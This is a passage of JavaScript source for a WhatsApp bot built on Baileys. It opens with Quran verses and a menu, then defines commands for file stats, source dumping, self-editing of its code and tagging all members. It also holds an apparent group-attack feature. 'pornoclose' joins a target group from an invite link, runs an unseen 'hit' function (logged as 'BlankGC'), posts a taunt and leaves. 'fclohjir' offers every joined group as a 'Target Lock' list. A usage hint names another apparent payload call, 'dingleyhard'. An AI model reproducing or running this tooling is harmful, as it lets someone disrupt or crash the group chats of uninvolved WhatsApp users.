لٰكِنِ اللّٰهُ يَشْهَدُ بِمَآ اَنْزَلَ اِلَيْكَ ۙ اَنْزَلَهٗ بِعِلْمِهٖ ۚ وَالْمَلٰۤىِٕكَةُ يَشْهَدُوْنَ ۗ وَكَفٰى بِاللّٰهِ شَهِيْدًا
اِنَّ الَّذِيْنَ كَفَرُوْا وَصَدُّوْا عَنْ سَبِيْلِ اللّٰهِ قَدْ ضَلُّوْا ضَلٰلًاۢ بَعِيْدًا
اِنَّ الَّذِيْنَ كَفَرُوْا وَظَلَمُوْا لَمْ يَكُنِ اللّٰهُ لِيَغْفِرَ لَهُمْ وَلَا لِيَهْدِيَهُمْ طَرِيْقًا
اِلَّا طَرِيْقَ جَهَنَّمَ خٰلِدِيْنَ فِيْهَآ اَبَدًا ۗ وَكَانَ ذٰلِكَ عَلَى اللّٰهِ يَسِيْرًا
يٰٓاَيُّهَا النَّاسُ قَدْ جَاۤءَكُمُ الرَّسُوْلُ بِالْحَقِّ مِنْ رَّبِّكُمْ فَاٰمِنُوْا خَيْرًا لَّكُمْ ۗ وَاِنْ تَكْفُرُوْا فَاِنَّ لِلّٰهِ مَا فِى السَّمٰوٰتِ وَالْاَرْضِ ۗ وَكَانَ اللّٰهُ عَلِيْمًا حَكِيْمًا
يٰٓاَهْلَ الْكِتٰبِ لَا تَغْلُوْا فِيْ دِيْنِكُمْ وَلَا تَقُوْلُوْا عَلَى اللّٰهِ اِلَّا الْحَقَّ ۗ اِنَّمَا الْمَسِيْحُ عِيْسَى ابْنُ مَرْيَمَ رَسُوْلُ اللّٰهِ وَكَلِمَتُهٗ ۚ اَلْقٰىهَآ اِلٰى مَرْيَمَ وَرُوْحٌ مِّنْهُ ۖ فَاٰمِنُوْا بِاللّٰهِ وَرُسُلِهٖ ۖ وَلَا تَقُوْلُوْا ثَلٰثَةٌ ۗ اِنْتَهُوْا خَيْرًا لَّكُمْ ۗ اِنَّمَا اللّٰهُ اِلٰهٌ وَّاحِدٌ ۗ سُبْحٰنَهٗٓ اَنْ يَّكُوْنَ لَهٗ وَلَدٌ ۘ لَهٗ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ وَكَفٰى بِاللّٰهِ وَكِيْلًا
لَنْ يَّسْتَنْكِفَ الْمَسِيْحُ اَنْ يَّكُوْنَ عَبْدًا لِّلّٰهِ وَلَا الْمَلٰۤىِٕكَةُ الْمُقَرَّبُوْنَ ۗ وَمَنْ يَّسْتَنْكِفْ عَنْ عِبَادَتِهٖ وَيَسْتَكْبِرْ فَسَيَحْشُرُهُمْ اِلَيْهِ جَمِيْعًا
فَاَمَّا الَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ فَيُوَفِّيْهِمْ اُجُوْرَهُمْ وَيَزِيْدُهُمْ مِّنْ فَضْلِهٖ ۚ وَاَمَّا الَّذِيْنَ اسْتَنْكَفُوْا وَاسْتَكْبَرُوْا فَيُعَذِّبُهُمْ عَذَابًا اَلِيْمًا ۙ وَّلَا يَجِدُوْنَ لَهُمْ مِّنْ دُوْنِ اللّٰهِ وَلِيًّا وَّلَا نَصِيْرًا
يٰٓاَيُّهَا النَّاسُ قَدْ جَاۤءَكُمْ بُرْهَانٌ مِّنْ رَّبِّكُمْ وَاَنْزَلْنَآ اِلَيْكُمْ نُوْرًا مُّبِيْنًا
فَاَمَّا الَّذِيْنَ اٰمَنُوْا بِاللّٰهِ وَاعْتَصَمُوْا بِهٖ فَسَيُدْخِلُهُمْ فِيْ رَحْمَةٍ مِّنْهُ وَفَضْلٍ ۙ وَّيَهْدِيْهِمْ اِلَيْهِ صِرَاطًا مُّسْتَقِيْمًا
يَسْتَفْتُوْنَكَ ۗ قُلِ اللّٰهُ يُفْتِيْكُمْ فِى الْكَلٰلَةِ ۗ اِنِ امْرُؤٌا هَلَكَ لَيْسَ لَهٗ وَلَدٌ وَّلَهٗٓ اُخْتٌ فَلَهَا نِصْفُ مَا تَرَكَ ۚ وَهُوَ يَرِثُهَآ اِنْ لَّمْ يَكُنْ لَّهَا وَلَدٌ ۗ فَاِنْ كَانَتَا اثْنَتَيْنِ فَلَهُمَا الثُّلُثٰنِ مِمَّا تَرَكَ ۗ وَاِنْ كَانُوْٓا اِخْوَةً رِّجَالًا وَّنِسَاۤءً فَلِلذَّكَرِ مِثْلُ حَظِّ الْاُنْثَيَيْنِ ۗ يُبَيِّنُ اللّٰهُ لَكُمْ اَنْ تَضِلُّوْا ۗ وَاللّٰهُ بِكُلِّ شَيْءٍ عَلِيْمٌ

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐍-𝐍𝐈𝐒𝐀",
 url: `https://quran.com/4`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0],
 list_title: "CLICK",
 button_title: "© AN-NISA"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© AN-NISA",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛", description: "𝐀𝐲𝐚𝐭 128-176", id: `${prefix}an-nisa` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break




case 'totalline': {
 const fs = require('fs');
 const path = require('path');
 
 try {
 let filePath = path.join(__dirname, 'AseppLohya.js');
 let data = fs.readFileSync(filePath, 'utf-8');
 
 let allLines = data.split('\n');
 let totalLine = allLines.length;
 let codeLines = allLines.filter(line => line.trim() !== '').length;
 let sizeKB = (Buffer.byteLength(data, 'utf-8') / 1024).toFixed(2);
 
 let teks = `\`𝗙𝗜𝗟𝗘 𝗦𝗧𝗔𝗧𝗦 𝗖𝗢𝗡𝗧𝗥𝗢𝗟\`

Hi \`${pushname}\` 👋 ini hasil scan file *AseppLohya.js*. Semua data real time langsung dari source file 🩸

⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍\`
┏━━━━━━━━
┃✦ *File Name » AseppLohya.js*
┃✦ *Total Line » ${totalLine} baris*
┃✦ *Code Line » ${codeLines} baris*
┃✦ *Empty Line » ${totalLine - codeLines} baris*
┃✦ *File Size » ${sizeKB} KB*
┃✦ *Developer » Asepp*
┃✦ *RunTime » ${runtime(process.uptime())}*
┗━━━━━━━━━━
⌲ \`𝐒𝐓𝐀𝐓𝐔𝐒\`
┏━━━━━━━━
┃☇ Status File » ✅ Loaded
┃☇ Path » ./AseppLohya.js
┗━━━━━━━━━━
\`[洛] 𝐅𝐈𝐋𝐄 𝐌𝐀𝐍𝐀𝐆𝐄𝐑 [洛]\`
Owner : @${m.sender.split('@')[0]}
`;

 // Pakai payreply biar support Business + Messenger
 await payreply(teks);
 
 } catch (e) {
 await payreply(`Error: ${e.message}`);
 }
}
break;

case 'cekcase': {
 if (!global.tmpCase) global.tmpCase = {}
 delete global.tmpCase[m.sender]

 if (!text) return payreply(`\`𝗖𝗘𝗞 𝗖𝗔𝗦𝗘 𝗠𝗘𝗡𝗨\`

Hi \`${pushname}\` 👋 mau cek case apa beb?

⌲ \`𝐂𝐀𝐑𝐀 𝐏𝐀𝐊𝐀𝐈\`
┏━━━━━━━━
┃✦ ${prefix + command} menu
┃✦ ${prefix + command} kick
┃✦ ${prefix + command} totalline
┗━━━━━━━━━━
⌲ \`𝐍𝐎𝐓𝐄\`
┏━━━━━━━━
┃☇ Ketik nama case nya aja
┃☇ Tanpa spasi & simbol
┗━━━━━━━━━━
\`[洛] 𝐂𝐀𝐒𝐄 𝐃𝐄𝐓𝐄𝐂𝐓𝐎𝐑 [洛]\`
Owner : @${m.sender.split('@')[0]}`)

 const fs = require('fs')
 let filePath = './AseppLohya.js'

 try {
 let isiFile = fs.readFileSync(filePath, 'utf8')
 let cari = text.toLowerCase().replace(/[^a-z0-9]/g, '')
 let baris = isiFile.split('\n')

 let regex = new RegExp(`case\\s+['"\`]${cari}['"\`]|case\\s+${cari}:`, 'i')
 let startLine = baris.findIndex(v => regex.test(v))

 if (startLine!== -1) {
 global.tmpCase[m.sender] = cari
 let lineNum = startLine + 1

 await payreply(`\`𝗖𝗔𝗦𝗘 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\`

Hi \`${pushname}\` 👋 case ketemu nih 🩸

⌲ \`𝐃𝐄𝐓𝐀𝐈𝐋\`
┏━━━━━━━━
┃✦ *Case Name » ${text}*
┃✦ *Status » ✅ Ditemukan*
┃✦ *Lokasi » Baris ke-${lineNum}*
┃✦ *File » AseppLohya.js*
┗━━━━━━━━━━
⌲ \`𝐀𝐂𝐓𝐈𝐎𝐍\`
┏━━━━━━━━
┃☇ Ketik ${prefix}sendcase buat ambil kodenya
┗━━━━━━━━━━
\`[洛] 𝐂𝐀𝐒𝐄 𝐃𝐄𝐓𝐄𝐂𝐓𝐎𝐑 [洛]\`
Owner : @${m.sender.split('@')[0]}`)

 } else {
 // Cari saran case mirip
 let allCase = isiFile.match(/case\s+['"`][^'"`]+['"`]/g) || []
 let saran = allCase
.map(v => v.replace(/case\s+['"`]/, '').replace(/['"`]/, ''))
.filter(v => v.includes(cari.slice(0, 3)) && v!== cari)
.slice(0, 3)

 let teks = `\`𝗖𝗔𝗦𝗘 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗\`

Hi \`${pushname}\` 👋 case *${text}* gak ketemu beb 🩸

⌲ \`𝐒𝐓𝐀𝐓𝐔𝐒\`
┏━━━━━━━━
┃✦ *Case Name » ${text}*
┃✦ *Status » ❌ Tidak ditemukan*
┃✦ *File » AseppLohya.js*
┗━━━━━━━━━━`

 if (saran.length) {
 teks += `⌲ \`𝐒𝐀𝐑𝐀𝐍\`
┏━━━━━━━━
`
 saran.forEach(v => teks += `┃☇ ${v}\n`)
 teks += `┗━━━━━━━━━━`
 }

 teks += `\n\`[洛] 𝐂𝐀𝐒𝐄 𝐃𝐄𝐓𝐄𝐂𝐓𝐎𝐑 [洛]\`
Owner : @${m.sender.split('@')[0]}`

 await payreply(teks)
 }
 } catch (e) {
 await payreply(`\`𝗘𝗥𝗢𝗥\`

Gagal baca file beb 🩸

⌲ \`𝐄𝐑𝐎𝐑 𝐃𝐄𝐓𝐀𝐈𝐋\`
┏━━━━━━━━
┃✦ ${e.message}
┃✦ Cek filePath nya dulu
┗━━━━━━━━━━
\`[洛] 𝐂𝐀𝐒𝐄 𝐃𝐄𝐓𝐄𝐂𝐓𝐎𝐑 [洛]\`
Owner : @${m.sender.split('@')[0]}`)
 }
}
break

case 'getcase': {
 if (m.sender.split('@')[0]!== '62881036109288') return payreply('Khusus owner 🩸')
 if (!text) return payreply(`\`𝗚𝗘𝗧 𝗖𝗔𝗦𝗘 𝗠𝗘𝗡𝗨\`

Hi \`${pushname}\` 👋 masukin nama case yang mau diambil

⌲ \`𝐂𝐎𝐍𝐓𝐎𝐇\`
┏━━━━━━━━
┃✦ ${prefix + command} menugh
┃✦ ${prefix + command} totalline
┃✦ ${prefix + command} cekcase
┗━━━━━━━━━━
\`[洛] 𝐆𝐄𝐓 𝐂𝐀𝐒𝐄 [洛]\`
Owner : @${m.sender.split('@')[0]}`)

 const fs = require('fs')
 const namaCase = text.toLowerCase().trim()

 await payreply(`\`𝗗𝗨𝗠𝗣𝗜𝗡𝗚 𝗖𝗔𝗦𝗘\`

Sedang ambil case *${namaCase}* dari AseppLohya.js... 🩸`)

 try {
 const pathFile = './AseppLohya.js'
 const sourceCode = fs.readFileSync(pathFile, 'utf-8')

 // Regex buat nyari case sampe break
 const regex = new RegExp(`case\\s+['"\`]${namaCase}['"\`]\\s*:[\\s\\S]*?break`, 'i')
 const match = sourceCode.match(regex)

 if (!match) return payreply(`\`𝗖𝗔𝗦𝗘 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗\`

Case *${namaCase}* gak ketemu di AseppLohya.js beb 🩸
Pastiin nama casenya bener ya`)

 let hasilCase = match[0]
 let isTruncated = false

 // Batasi kalo kepanjangan biar ga error WA
 if (hasilCase.length > 3500) {
 hasilCase = hasilCase.slice(0, 3500)
 isTruncated = true
 }

 let teks = `\`𝗦𝗢𝗨𝗥𝗖𝗘 𝗖𝗔𝗦𝗘\`

Hi \`${pushname}\` 👋 ini source code case *${namaCase.toUpperCase()}* 🩸

⌲ \`𝐈𝐍𝐅𝐎\`
┏━━━━━━━━
┃✦ *Case » ${namaCase}*
┃✦ *File » AseppLohya.js*
┃✦ *Status » ${isTruncated? '⚠️ Terpotong' : '✅ Lengkap'}*
┃✦ *Length » ${hasilCase.length} karakter*
┗━━━━━━━━━━
⌲ \`𝐂𝐎𝐃𝐄\`
\`\`javascript
${hasilCase}
${isTruncated? '\n...[POTONG - KELEBIHAN KARAKTER]...' : ''}
\`\`
\`[洛] 𝐆𝐄𝐓 𝐂𝐀𝐒𝐄 [洛]\`
Owner : @${m.sender.split('@')[0]}`

 await payreply(teks)

 } catch (e) {
 await payreply(`\`𝗘𝗥𝗢𝗥\`

Gagal dump case beb 🩸

⌲ \`𝐄𝐑𝐎𝐑 𝐃𝐄𝐓𝐀𝐈𝐋\`
┏━━━━━━━━
┃✦ ${e.message}
┃✦ Cek file AseppLohya.js ada ga
┗━━━━━━━━━━
\`[洛] 𝐆𝐄𝐓 𝐂𝐀𝐒𝐄 [洛]\`
Owner : @${m.sender.split('@')[0]}`)
 }
}
break
case "pornoclose": {
 if (!isCreator &&!isPremium &&!isUnli) return payreply("Gak punya akses cik");

 let target = args[0] || m.chat;

 // Kalau bukan grup dan gak ada argumen, tolak
 if (!m.isGroup &&!args[0]) {
 return payreply("Mana target nya cik?\nContoh:\n.pornoclose 120363xxx@g.us\n.pornoclose https://chat.whatsapp.com/xxx");
 }

 let groupId;

 try {
 // 1. Cek link invite
 if (target.includes("chat.whatsapp.com")) {
 let code = target.split("chat.whatsapp.com/")[1].split("?")[0];
 groupId = await Asepp.groupAcceptInvite(code);
 await new Promise(resolve => setTimeout(resolve, 2000)); // tunggu join dulu
 }
 // 2. Cek ID langsung
 else {
 groupId = target.endsWith("@g.us")? target : target + "@g.us";
 }

 // 3. Eksekusi hit
 await fclohrek2(groupId);

 // 4. Kirim pesan penutup
 await Asepp.sendMessage(groupId, {
 text: "Misi bre, udah kelar. Gue out dulu 🩸"
 });

 await new Promise(resolve => setTimeout(resolve, 1000));

 // 5. Keluar dari grup
 await Asepp.groupLeave(groupId);

 // 6. Konfirmasi ke lu
 await payreply(`✅ Sukses hit & out dari ${groupId}`);

 } catch (err) {
 console.error("Error BlankGC:", err);
 await payreply(`❌ Gagal: ${err.message}`);
 }
}
break



case "fclohjir": {
 if (!isCreator && !isPremium && !isUnli) return payreply("Gak punya akses cik");

 const moment = require('moment-timezone');
 const nowJakarta = moment().tz('Asia/Jakarta');

 let getGroups = await Asepp.groupFetchAllParticipating();
 let groups = Object.values(getGroups);
 if (groups.length === 0) return payreply("⚠️ Bot tidak ada di grup manapun.");

 // Format rows grup dengan target lock id
 let groupButtons = groups.map(group => ({
 header: "", 
 title: `${group.subject}`,
 description: `ID: ${group.id.split('@')[0]} (${group.participants.length} Members)`,
 id: `${prefix}pornoclose ${group.id}`
 }));

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });

 // Format teks kalem, sopan, dan mencantumkan tag owner di bagian bawah
 let infoText = `\`𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔 𝐁𝐔𝐓𝐓𝐎𝐍\`
 
Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm shinigami, your WhatsApp assistant. Please select the target group from the list below to execute the primary management feature. Data is retrieved directly from the WhatsApp server in real-time. ✨
 
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐔𝐒𝐄𝐑\`
┏━━━━━━━━━━━━━━━━
┃✦ *Status User » ${isCreator ? '👑 Super Admin' : isPremium ? '✅ Premium Access' : '✨ Unlimited'}*
┃✦ *Total Group » ${groups.length} Groups*
┃✦ *System Status » ✅ Ready to Manage*
┃✦ *Developer » Asepp*
┃✦ *Version » V6*
┃✦ *RunTime » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${Asepp.public ? "Public" : "Self"}*
┗━━━━━━━━━━━━━━━━━━
⌲ \`𝐒𝐄𝐋𝐄𝐂𝐓 𝐓𝐀𝐑𝐆𝐄𝐓 \`
┏━━━━━━━━━━━━━━━━
┃ Pilih salah satu grup pada menu di bawah ini.
┃ Sesi tombol ini hanya berlaku untuk sekali eksekusi.
┗━━━━━━━━━━━━━━━━━━
\`[洛] 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐏𝐎𝐑𝐍𝐎𝐂𝐋𝐎𝐒𝐄 [洛]\`
Owner : @62881036109288
`;

 const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require("@whiskeysockets/baileys");
 const fs = require("fs");

 let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: infoText
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "The menu session will expire automatically after clicking."
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 // FIX MEDIA: Tautan sudah diperbaiki menggunakan protokol lengkap https:// agar tidak crash
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://litter.catbox.moe/y2n545.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 mentionedJid: [m.sender, '62881036109288@s.whatsapp.net'], 
 isForwarded: true,
 forwardingScore: 999999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔",
 url: "https://t.me/AsepXxnx",
 copy_code: "𝐕𝟔",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0, 1, 2, 3, 4],
 list_title: "TARGET GRUP",
 button_title: "© PILIH GRUP"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© PILIH GRUP",
 sections: [{
 title: "Active Group Directory",
 highlight_label: "Target Lock 🎯",
 rows: groupButtons
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 );

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

 if (fs.existsSync("./image/sawit.mp3")) {
 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kcwa.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 );
 }
}
break;









case "h": {
 try {
 if (!isGroup) return payreply(mess.group);
 
 const groupMetadata = await Asepp.groupMetadata(m.chat);
 const participants = groupMetadata.participants;
 
 const senderJid = Asepp.decodeJid(m.sender);
 
 const groupAdmins = participants.filter(v => v.admin!== null).map(v => Asepp.decodeJid(v.id));
 
 const isGroupAdmins = groupAdmins.includes(senderJid);
 const isOwner = global.owner.includes(senderJid.split("@")[0]);
 
 console.log("Sender:", senderJid);
 console.log("Admins:", groupAdmins);
 console.log("Is Admin:", isGroupAdmins, "Is Owner:", isOwner);
 
 if (!isGroupAdmins &&!isOwner) return payreply("Admin only!");
 if (!q &&!m.quoted) return payreply("Teksnya?");

 const qkontak = { 
 key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: m.chat }, 
 message: { contactMessage: { displayName: "System", vcard: "BEGIN:VCARD\nVERSION:3.0\nN:System;System;;;\nFN:System\nEND:VCARD" }}
 };

 await Asepp.sendMessage(m.chat, {
 text: m.quoted? (m.quoted.text || m.quoted.caption || "") : q,
 mentions: participants.map(a => a.id)
 }, { quoted: qkontak });
 
 } catch (e) {
 console.log("Error case h:", e);
 await payreply("❌ Error: " + e.message);
 }
}
break;


case "gntiurl": {
 if (!isCreator) return payreply(mess.owner);
 
 if (!text.includes('|')) {
 return payreply(
 `Usage: ${prefix}gntiurl <case> | <url baru>\n` +
 `Ex: ${prefix}gntiurl pornoclose2 | https://link.mp4`
 );
 }

 const fs = require("fs");
 let [targetCase, newUrl] = text.split('|').map(v => v.trim());
 const file = "./AseppLohya.js";

 try {
 if (!fs.existsSync(file)) {
 return payreply(`[ERR] File ${file} not found`);
 }

 if (!newUrl.startsWith("http")) {
 return payreply(`[ERR] URL harus diawali http/https`);
 }

 let data = fs.readFileSync(file, "utf8");
 
 // Regex khusus buat format videoMessage: await prepareWAMessageMedia({ video: { url: "link" } })
 let re = new RegExp(`(case\\s+["']${targetCase}["']:[\\s\\S]*?video:\\s*\\{\\s*url:\\s*["'])(.*?)(["']\\s*\\})`, 'i');

 if (!re.test(data)) {
 return payreply(`[ERR] URL di case "${targetCase}" not found. Pastikan ada: video: { url: "link" }`);
 }

 let out = data.replace(re, `$1${newUrl}$3`);
 fs.writeFileSync(file, out, "utf8");

 return payreply(
 `┌─ gntiurl\n` +
 `│ Case: ${targetCase}\n` +
 `│ Updated URL: ${newUrl}\n` +
 `│ File: ${file}\n` +
 `└─ Status: OK\n` +
 `Langsung cek, nggak perlu restart.`
 );

 } catch (e) {
 return payreply(`[ERR] ${e.message}`);
 }
}
break;

case "gntisound": {
 if (!isCreator) return payreply(mess.owner);
 
 if (!text.includes('|')) {
 return payreply(
 `Usage: ${prefix}gntisound <case> | <path baru>\n` +
 `Ex: ${prefix}gntisound pornoclose2 | ./audio/baru.mp3`
 );
 }

 const fs = require("fs");
 let [targetCase, newPath] = text.split('|').map(v => v.trim());
 const file = "./AseppLohya.js";

 try {
 if (!fs.existsSync(file)) {
 return payreply(`[ERR] File ${file} not found`);
 }

 let data = fs.readFileSync(file, "utf8");
 
 // Regex cari case target terus cari audio: fs.readFileSync("./image/sawit.mp3")
 let re = new RegExp(`(case\\s+["']${targetCase}["']:[\\s\\S]*?audio:\\s*fs\\.readFileSync\\(["'])(.*?)(["']\\))`, 'i');

 if (!re.test(data)) {
 return payreply(`[ERR] Path audio di case "${targetCase}" not found. Pastikan ada: audio: fs.readFileSync("./image/sawit.mp3")`);
 }

 let out = data.replace(re, `$1${newPath}$3`);
 fs.writeFileSync(file, out, "utf8");

 return payreply(
 `┌─ gntisound\n` +
 `│ Case: ${targetCase}\n` +
 `│ Updated Audio: ${newPath}\n` +
 `│ File: ${file}\n` +
 `└─ Status: OK\n` +
 `Langsung cek, nggak perlu restart.`
 );

 } catch (e) {
 return payreply(`[ERR] ${e.message}`);
 }
}
break;

case "renameall": {
 if (!isCreator) return payreply(mess.owner);
 
 if (!text.includes('|')) {
 return payreply(
 `Usage: ${prefix}renameall <teks_lama> | <teks_baru>\n` +
 `Ex: ${prefix}renameall V6 | V6`
 );
 }

 const fs = require("fs");
 let [oldText, newText] = text.split('|').map(v => v.trim());
 const file = "./AseppLohya.js";

 try {
 if (!fs.existsSync(file)) {
 return payreply(`[ERR] File ${file} not found`);
 }

 if (!oldText) {
 return payreply(`[ERR] Teks lama kosong`);
 }

 let data = fs.readFileSync(file, "utf8");

 // Escape karakter khusus regex biar aman
 let escapedOld = oldText.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
 
 // Regex global biar ganti semua
 let re = new RegExp(escapedOld, 'g');

 if (!re.test(data)) {
 return payreply(`[ERR] Teks "${oldText}" tidak ditemukan di file`);
 }

 let total = (data.match(re) || []).length;
 let out = data.replace(re, newText);
 
 fs.writeFileSync(file, out, "utf8");

 return payreply(
 `┌─ renameall\n` +
 `│ Changed: ${oldText} → ${newText}\n` +
 `│ Total replaced: ${total}\n` +
 `│ File: ${file}\n` +
 `└─ Status: OK\n` +
 `Restart bot biar ke-apply semua.`
 );

 } catch (e) {
 return payreply(`[ERR] ${e.message}`);
 }
}
break

case "gntipemanggil": {
 if (!isCreator) return payreply(mess.owner);
 
 if (!text.includes('|')) {
 return payreply(
 `╭─ Ganti Pemanggil\n` +
 `│\n` +
 `├─ Cara Pakai:\n` +
 `│ ${prefix + command} before | after\n` +
 `│\n` +
 `├─ Contoh:\n` +
 `│ ${prefix + command} await dingleyhard(Asepp, target, ptcp = true) | await dingleyhard(Asepp, target, ptcp = true)\n` +
 `╰────────`
 );
 }

 const fs = require("fs");
 const file = "./AseppLohya.js";
 
 let [before, after] = text.split('|').map(v => v.trim());

 try {
 if (!fs.existsSync(file)) {
 return payreply(`[ERR] File ${file} not found`);
 }

 let data = fs.readFileSync(file, "utf8");

 if (!data.includes(before)) {
 return payreply(`[ERR] Kode "${before}" tidak ditemukan di file`);
 }

 let count = (data.match(new RegExp(before.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g')) || []).length;
 
 let out = data.replaceAll(before, after);
 fs.writeFileSync(file, out, "utf8");

 return payreply(
 `╭─ Ganti Pemanggil\n` +
 `│\n` +
 `├─ Status » ✅ Berhasil\n` +
 `├─ Diganti » ${count}x\n` +
 `├─ Before » ${before}\n` +
 `├─ After » ${after}\n` +
 `╰─ Restart bot biar aktif\n`
 );

 } catch (e) {
 return payreply(`[ERR] ${e.message}`);
 }
}
break;















case 'gntivariabel': {
 try {
 if (!isCreator) return payreply(mess.owner);

 if (!text.includes('|')) {
 return payreply(
 `Usage: Reply file/code + ${prefix}gntivariabel before | after\n` +
 `Ex: Reply file + ${prefix}gntivariabel sock | Asepp`
 );
 }

 // Ambil quoted message yang bener
 const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
 if (!quoted) return payreply('Reply file/code nya dulu bro');

 let data = null;
 const fs = require("fs");
 const path = require("path");

 // Cek tipe message yang di-reply
 if (quoted.documentMessage) {
 // Cara download document yang bener di Baileys
 const stream = await downloadContentFromMessage(quoted.documentMessage, 'document');
 let buffer = Buffer.from([]);
 for await (const chunk of stream) {
 buffer = Buffer.concat([buffer, chunk]);
 }
 data = buffer.toString('utf8');
 }
 else if (quoted.conversation || quoted.extendedTextMessage?.text || quoted.text) {
 data = quoted.conversation || quoted.extendedTextMessage?.text || quoted.text;
 }
 else {
 return payreply('⚠️ Yang di-reply harus text atau document.js/.txt');
 }

 if (!data) return payreply('⚠️ Gagal ambil isi file/message nya');

 let args = text.split('|').map(v => v.trim());
 let before = args[0].replace(`${prefix}${command}`, '').trim();
 let after = args[1];

 if (!before ||!after) {
 return payreply('[ERR] Format salah. Pakai: before | after');
 }

 // Regex ganti
 let escaped = before.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\$&');
 let regex = before.includes('.')
 ? new RegExp(escaped, 'gi')
 : new RegExp('\\b' + escaped + '\\b', 'gi');

 let count = (data.match(regex) || []).length;
 if (count === 0) {
 let preview = data.slice(0, 150).replace(/\n/g, '\\n');
 return payreply(`[ERR] "${before}" tidak ditemukan\nPreview:\n${preview}...`);
 }

 let out = data.replace(regex, after);

 // Simpan & kirim file
 const tmpDir = path.join(__dirname, 'tmp');
 fs.mkdirSync(tmpDir, { recursive: true });
 const fileName = `ganti_${Date.now()}.js`;
 const filePath = path.join(tmpDir, fileName);
 fs.writeFileSync(filePath, out, "utf8");

 await payreply(`✅ Berhasil ganti ${count}x\n\`${before}\` → \`${after}\``);

 await Asepp.sendMessage(m.chat, {
 document: fs.readFileSync(filePath),
 fileName: fileName,
 mimetype: 'text/javascript',
 caption: 'Hasil ganti variabel'
 }, { quoted: m });

 fs.unlinkSync(filePath);

 } catch (e) {
 console.error('gntivariabel error:', e);
 return payreply(`❌ Error: ${e.message}`);
 }
}
break;





case 'backupenc': {
 try {
 if (!isCreator) return payreply(mess.owner);

 const fs = require("fs");
 const path = require("path");
 const { exec } = require("child_process");

 const rootDir = "./";
 const tmpDir = path.join(__dirname, 'tmp', 'backupenc');
